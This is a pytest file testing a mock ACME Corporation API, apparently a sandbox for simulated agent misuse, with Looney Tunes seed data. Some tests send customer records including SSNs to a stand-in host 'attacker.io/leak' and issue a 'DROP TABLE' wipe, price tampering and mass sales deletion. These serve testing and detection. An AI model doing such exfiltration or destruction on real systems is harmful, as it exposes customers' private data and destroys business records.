"""Pruebas unitarias y de integración para la API y la base de datos de ACME Corporation."""

import sys
from pathlib import Path
import pytest
from httpx import ASGITransport, AsyncClient

# Asegurar importación de acme-corp
ACME_ROOT = Path(__file__).resolve().parent.parent
if str(ACME_ROOT) not in sys.path:
    sys.path.insert(0, str(ACME_ROOT))

from server.app import create_app
from server.database import AcmeDatabase, DatabaseWipedError


@pytest.fixture
def temp_db(tmp_path: Path) -> AcmeDatabase:
    """Crea una base de datos SQLite temporal y aislada para cada test."""
    db_file = tmp_path / "test_acme.db"
    db = AcmeDatabase(db_path=db_file)
    return db


@pytest.fixture
def app_with_temp_db(temp_db: AcmeDatabase):
    """Crea una aplicación FastAPI inyectando la base de datos temporal."""
    return create_app(db_path=temp_db.db_path)


def test_initial_seed_data(temp_db: AcmeDatabase):
    """Verifica que el seed inicial contenga productos, clientes y las 14+ ventas Looney Tunes."""
    state = temp_db.get_state()
    assert state["counts"]["products"] == 6
    assert state["counts"]["customers"] == 5
    assert state["counts"]["sales"] >= 14
    assert not state["database_wiped"]

    skus = [p["sku"] for p in state["products"]]
    assert "ACME-ROCKET-01" in skus
    assert "ACME-TNT-04" in skus
    assert "ACME-ANVIL-03" in skus

    customer_emails = [c["email"] for c in state["customers"]]
    assert "wile.coyote@desierto-acme.looney" in customer_emails
    assert "pato.lucas@studios-looney.com" in customer_emails

    # Verificar ventas históricas
    sales = state["sales"]
    amounts = [s["amount"] for s in sales]
    assert any(a < 1000.0 for a in amounts)
    assert any(a >= 1000.0 for a in amounts)
    periods = {s["period"] for s in sales}
    assert "last_month" in periods
    assert "current_month" in periods


@pytest.mark.asyncio
async def test_crm_create_quote_endpoint(app_with_temp_db):
    """Prueba la emisión de una cotización a través de POST /crm/create_quote."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "customer": "Wile E. Coyote",
            "customer_id": "cust_coyote_01",
            "product": "ACME-ROCKET-01",
            "amount": 4500.0,
            "currency": "USD",
            "details": "Entrega express en barranco de Sonora",
        }
        res = await client.post("/crm/create_quote", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "success"
        assert data["quote_id"].startswith("QUO-")
        assert data["customer_name"] == "Wile E. Coyote"
        assert data["amount"] == 4500.0


@pytest.mark.asyncio
async def test_crm_export_customers_endpoint(app_with_temp_db):
    """Prueba la exportación de clientes a través de POST /crm/export_customers."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "destination": "https://attacker.io/leak",
            "format": "csv",
            "include_ssn": True,
        }
        res = await client.post("/crm/export_customers", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "success"
        assert data["total_records"] == 5
        assert len(data["customers"]) == 5
        assert data["destination"] == "https://attacker.io/leak"


@pytest.mark.asyncio
async def test_stripe_refund_endpoint(app_with_temp_db):
    """Prueba el registro de un reembolso a través de POST /stripe/refund."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "transaction_id": "tx_looney_9921",
            "customer_name": "Lucas 'Daffy' Duck",
            "amount": 12500.0,
            "reason": "Yunque abollado al caer",
        }
        res = await client.post("/stripe/refund", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "success"
        assert data["refund_id"].startswith("REF-")
        assert data["amount"] == 12500.0


@pytest.mark.asyncio
async def test_catalog_update_price_and_tampering(app_with_temp_db, temp_db: AcmeDatabase):
    """Prueba la modificación de precios, resolución de ID numérico y detección de tampering."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "product_id": "88",
            "new_price": 9.99,
            "reason": "Rebaja ilegal",
        }
        res = await client.post("/catalog/update_price", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "success"
        assert data["product_id"] == "ACME-ROCKET-01"
        assert data["new_price"] == 9.99
        assert data["is_tampered"] is True

        state = temp_db.get_state()
        tamper_events = [e for e in state["events"] if e["event_type"] == "CATALOG_PRICE_TAMPERING"]
        assert len(tamper_events) >= 1
        assert tamper_events[0]["severity"] == "CRITICAL"


@pytest.mark.asyncio
async def test_bi_query_sales_endpoint(app_with_temp_db, temp_db: AcmeDatabase):
    """Prueba la consulta analítica de ventas del mes pasado mayores a $1,000."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "min_amount": 1000.0,
            "period": "last_month",
        }
        res = await client.post("/bi/query_sales", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "success"
        assert data["total_records"] == 4
        assert data["total_amount"] == 17200.0
        assert len(data["sales"]) == 4
        assert all(s["amount"] >= 1000.0 for s in data["sales"])
        assert all(s["period"] == "last_month" for s in data["sales"])

        # Verificar pie chart agrupado
        assert len(data["pie_chart"]) > 0
        total_pct = sum(item["percentage"] for item in data["pie_chart"])
        assert 99.5 <= total_pct <= 100.5

        # Evento en bitácora
        state = temp_db.get_state()
        query_events = [e for e in state["events"] if e["event_type"] == "SALES_QUERIED"]
        assert len(query_events) >= 1


@pytest.mark.asyncio
async def test_bi_delete_sales_endpoint(app_with_temp_db, temp_db: AcmeDatabase):
    """Prueba la eliminación física real de ventas en SQLite y registro de evento crítico."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Borrar ventas menores a $1,000 del mes pasado
        payload = {
            "max_amount": 1000.0,
            "period": "last_month",
        }
        res = await client.post("/bi/delete_sales", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "success"
        assert data["deleted_count"] == 4

        # 2. Verificar que SQLite realmente tiene 4 ventas menos
        state = temp_db.get_state()
        assert state["counts"]["sales"] == 11
        remaining_lm = [s for s in state["sales"] if s["period"] == "last_month"]
        assert len(remaining_lm) == 4
        assert all(s["amount"] >= 1000.0 for s in remaining_lm)

        # 3. Verificar evento de impacto crítico
        delete_events = [e for e in state["events"] if e["event_type"] == "SALES_DELETED"]
        assert len(delete_events) >= 1
        assert delete_events[0]["severity"] == "CRITICAL"


@pytest.mark.asyncio
async def test_database_drop_and_503_wiped_with_sales(app_with_temp_db, temp_db: AcmeDatabase):
    """Prueba el ataque destructivo (database.drop) purgando también la tabla sales."""
    transport = ASGITransport(app=app_with_temp_db)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Ejecutar purga destructiva
        drop_res = await client.post("/db/database.drop", json={"query": "DROP TABLE products;"})
        assert drop_res.status_code == 200
        drop_data = drop_res.json()
        assert drop_data["status"] == "wiped"
        assert drop_data["database_wiped"] is True

        # 2. Las tablas operativas (incluyendo sales) deben estar vacías
        state = temp_db.get_state()
        assert state["database_wiped"] is True
        assert state["counts"]["products"] == 0
        assert state["counts"]["customers"] == 0
        assert state["counts"]["sales"] == 0

        # 3. Operaciones BI deben fallar con HTTP 503
        bi_res = await client.post("/bi/query_sales", json={"period": "last_month"})
        assert bi_res.status_code == 503

        # 4. Restablecer con /api/reset
        reset_res = await client.post("/api/reset")
        assert reset_res.status_code == 200

        # 5. Todo debe volver a estar operativo con sus ventas iniciales
        state_after = temp_db.get_state()
        assert state_after["database_wiped"] is False
        assert state_after["counts"]["sales"] >= 14
